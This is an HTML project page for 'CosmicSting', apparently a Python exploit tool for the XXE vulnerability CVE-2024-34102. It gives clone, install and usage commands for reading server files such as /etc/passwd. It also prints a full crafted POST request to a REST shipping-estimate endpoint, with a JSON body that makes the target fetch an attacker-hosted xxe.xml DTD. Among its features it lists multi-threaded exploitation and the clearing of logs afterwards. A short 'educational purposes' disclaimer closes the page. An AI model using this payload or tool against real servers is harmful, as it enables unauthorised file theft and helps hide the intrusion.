<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CVE-2024-34102 Exploit - CosmicSting</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 0;
            background: #000;
            color: #f5f5f5;
        }
        header, footer {
            background: #222;
            color: #f5f5f5;
            padding: 10px 0;
            text-align: center;
        }
        .container {
            width: 80%;
            margin: auto;
            overflow: hidden;
        }
        h1, h2 {
            color: #ffffff;
        }
        pre {
            background: #1e1e1e;
            border-left: 3px solid #4CAF50;
            padding: 10px;
            overflow-x: auto;
            position: relative;
            color: #e0e0e0;
            border-radius: 5px;
            margin: 10px 0;
        }
        .copy-button {
            position: absolute;
            top: 10px;
            right: 10px;
            background: #4CAF50;
            border: none;
            color: #fff;
            padding: 5px 10px;
            cursor: pointer;
            border-radius: 5px;
            font-size: 14px;
        }
        .copy-button:hover {
            background: #45a049;
        }
        a {
            color: #4CAF50;
        }
        a:hover {
            color: #81c784;
        }
        ul {
            list-style: none;
            padding: 0;
        }
        ul li {
            margin-bottom: 5px;
        }
        .code {
            background: #1e1e1e;
            color: #e0e0e0;
            padding: 5px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <h1 style="color:white;">CVE-2024-34102 Exploit - CosmicSting</h1>
        </div>
    </header>

    <div class="container">
        <section>
            <h2 style="color:white;">Overview</h2>
            <p>CosmicSting is a Python script designed to exploit an XML External Entity (XXE) vulnerability (CVE-2024-34102) that could potentially lead to arbitrary code execution. This script demonstrates how an attacker could exploit such vulnerabilities to read sensitive files from a server using XML-based requests.</p>
        </section>

        <section>
            <h2 style="color:white;">Features</h2>
            <ul>
                <li>Exploits an XXE vulnerability to execute malicious requests.</li>
                <li>Generates a callback URL for hosting a DTD file.</li>
                <li>Uses multi-threading for faster exploitation.</li>
                <li>Clears and removes instance logs on the SSRF API after exploitation.</li>
            </ul>
        </section>

        <section>
            <h2 style="color:white;">Requirements</h2>
            <ul>
                <li>Python 3.x</li>
                <li>Dependencies:
                    <ul>
                        <li>requests</li>
                        <li>click</li>
                        <li>fake_useragent</li>
                    </ul>
                </li>
            </ul>
        </section>

        <section>
            <h2 style="color:white;">Installation</h2>
            <p>Clone the repository:</p>
            <pre><code id="clone-code">git clone https://github.com/bughuntar/CVE-2024-34102-Python
cd CVE-2024-34102-Python</code>
                <button class="copy-button" onclick="copyCode('clone-code')">Copy</button>
            </pre>
            <p>Install dependencies using pip:</p>
            <pre><code id="install-code">pip install -r requirements.txt
chmod +x *</code>
                <button class="copy-button" onclick="copyCode('install-code')">Copy</button>
            </pre>
        </section>

        <section>
            <h2 style="color:white;">Usage</h2>
            <p>Run the script with the required URL parameter and optional file parameter:</p>
            <pre><code id="usage-code">python cosmic_sting.py --url &lt;target_url&gt; [--file &lt;file_to_read&gt;] [-t &lt;threads&gt;]</code>
                <button class="copy-button" onclick="copyCode('usage-code')">Copy</button>
            </pre>
            <p>Options:</p>
            <ul>
                <li><code>-u, --url</code>: Specifies the URL or domain for vulnerability detection. This option is required.</li>
                <li><code>-f, --file</code>: Allows specifying the file to read from the server. Defaults to /etc/passwd if not provided explicitly.</li>
                <li><code>-t, --threads</code>: Specifies the number of concurrent threads to use for exploitation. Defaults to 5.</li>
            </ul>
            <p>Example:</p>
            <pre><code id="example-code">python cosmic_sting.py --url https://example.com --file /etc/hosts -t 10</code>
                <button class="copy-button" onclick="copyCode('example-code')">Copy</button>
            </pre>
            <p>Crafted XML DTD file POST request:</p>
            <pre><code id="post-request-code">POST /rest/V1/guest-carts/1/estimate-shipping-methods HTTP/1.1
Host: {{hostname}}
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: close
Content-Type: application/json
Content-Length: 187

{"address":{"totalsCollector":{"collectorList":{"totalCollector":{"sourceData":{"data":"https://{{hostedXMLfile.com}}/xxe.xml","dataIsURL":true,"options":1234}}}}}}</code>
                <button class="copy-button" onclick="copyCode('post-request-code')">Copy</button>
            </pre>
        </section>

        <section>
            <h2 style="color:white;">Acknowledgements</h2>
            <p>This script is created by Professor the Hunter for educational purposes. Use it responsibly and only on systems you own or have permission to test.</p>
        </section>

        <section>
            <h2 style="color:white;">About</h2>
            <p>CVE-2024-34102 Exploiter based on Python</p>
        </section>

        <section>
            <h2 style="color:white;">Topics</h2>
            <p>cve-2024-34102</p>
        </section>
    </div>

    <footer style="margin-top: 20px; font-size: 14px; color: #666;">&copy; 2024 
        Powered by <a href="https://bughuntar.com" target="_blank" style="color: #007bff; text-decoration: none;">Professor Software Solutions</a>
    </footer>

    <script>
        function copyCode(codeId) {
            var codeElement = document.getElementById(codeId);
            var textArea = document.createElement("textarea");
            textArea.value = codeElement.innerText;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand("copy");
            document.body.removeChild(textArea);
            alert("Code copied to clipboard!");
        }
    </script>
</body>
</html>
